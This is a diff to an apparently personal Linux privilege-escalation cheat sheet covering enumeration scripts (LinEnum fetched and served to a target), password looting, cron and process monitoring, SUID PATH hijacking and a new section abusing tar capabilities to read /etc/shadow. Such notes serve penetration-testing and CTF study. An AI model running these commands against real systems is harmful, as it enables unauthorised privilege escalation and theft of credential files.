@@ -9,7 +9,7 @@ which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp curl 
 # Check for running processes of other users (not your current one)
 ps -elf | grep -v $(whoami)
 
-# Install Linenum.sh
+# Enumeration with Linenum.sh
 mkdir /tmp/linenum
 cd /tmp/linenum
 wget 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh' -O ./linenum.sh
@@ -17,6 +17,12 @@ python -m http.server
 
 On Target:
 wget 'http://172.28.128.1:8000/linenum.sh' -O /tmp/linenum.sh
+
+# Enumeration with LinPEAS
+
+
+# Enumeration with lse
+
 
 # Looting Passwords
 grep -nril 'password' /home/ 2> /dev/null
@@ -49,7 +55,7 @@ Check: /etc/security/opasswd
 ## In-Memory Passwords
 strings /dev/mem -n10 | grep -i PASS
 
-## Files containing in name "password"
+## Files containing the string "password" in their name
 updatedb
 locate password
 
@@ -70,7 +76,7 @@ find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
 ## List all cron jobs
 for i in d hourly daily weekly monthly; do echo; echo "--cron.$i--"; ls -l /etc/cron.$i; done
 
-## print both commands and file system events and scan procfs every 1000 ms (=1sec)
+## Print commands and file system events and scan procfs every 1000 ms (=1sec)
 pspy64 -pf -i 1000 
 
 # Find SUID binaries
@@ -83,7 +89,7 @@ gcc -o /tmp/suid /tmp/suid.c
 sudo chmod +x /tmp/suid # execute right
 sudo chmod +s /tmp/suid # setuid bit
 
-# Exploiting SUID binaries
+# Exploiting SUID binaries using relative paths
 ## Relative Path (Whenever a SUID binary is calling a program, e.g., cat)
 echo $PATH
 echo '/bin/bash' > /tmp/cat
@@ -91,6 +97,16 @@ chmod 777 cat
 export PATH=/tmp:$PATH
 
 
+# Capabilities
+
+## Search for files with capabilities set
+getcap -r / 2>/dev/null
+;; generally we are particularly interested in the capabilities with "ep"
+;; Let's say tar has "tar = cap_dac_read_search+ep", this means that tar
+;; can read everything, hence we could abuse it to get the shadow file:
+tar -cvf shadow.tar /etc/shadow
+tar -xvf shadow.tar 
+cat etc/shadow 
 
 # A recap of techniques
 
